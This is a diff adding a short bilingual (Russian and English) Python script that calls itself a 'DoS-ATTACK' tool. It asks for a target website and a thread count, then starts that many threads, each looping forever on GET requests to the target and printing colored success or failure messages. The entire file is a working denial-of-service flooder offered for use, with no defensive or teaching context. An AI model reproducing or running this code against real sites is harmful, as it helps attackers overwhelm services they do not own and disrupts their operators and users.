@@ -1,0 +1,42 @@
+from colorama import init, Fore, Back, Style
+import requests
+import time
+import threading
+import os 
+import random
+init(autoreset=True)
+launge = input("Введите свой язык / Enter your launge\nen - english\nru - russian\nEnter:\t")
+if launge.lower() == "ru":
+    os.system("title DoS-АТАКА")
+
+    def ddos():
+        while 1:
+            try:        
+                rep = requests.get(url)
+                print(Fore.GREEN + f"[+] Запрос был успешно отправлен!")
+
+            except requests.exceptions.ConnectionError:
+                print(Fore.RED + "[+] Запрос не был отправлен")
+    url = input("Введите ссылку на сайт:\t\t")
+    print(Fore.CYAN + f"Dos Атака на сайт: {url[7:]}\n")
+    thn = input("Введите кол-во потоков:\t")
+    for i in range(int(thn)):
+        thr = threading.Thread(target=ddos)
+        thr.start()
+if launge.lower() == "en":
+    os.system("title DoS-ATTACK")
+
+    def ddos():
+        while 1:
+            try:        
+                rep = requests.get(url)
+                print(Fore.GREEN + f"[+] Requests was sucusufelly sent!")
+
+            except requests.exceptions.ConnectionError:
+                print(Fore.RED + "[+] Requests not was sent!")
+    url = input("Enter link on site:\t")
+    print(Fore.CYAN + f"Dos attack on site: {url[7:]}\n")
+    thn = input("Enter potoks:\t")
+    for i in range(int(thn)):
+        thr = threading.Thread(target=ddos)
+        thr.start()
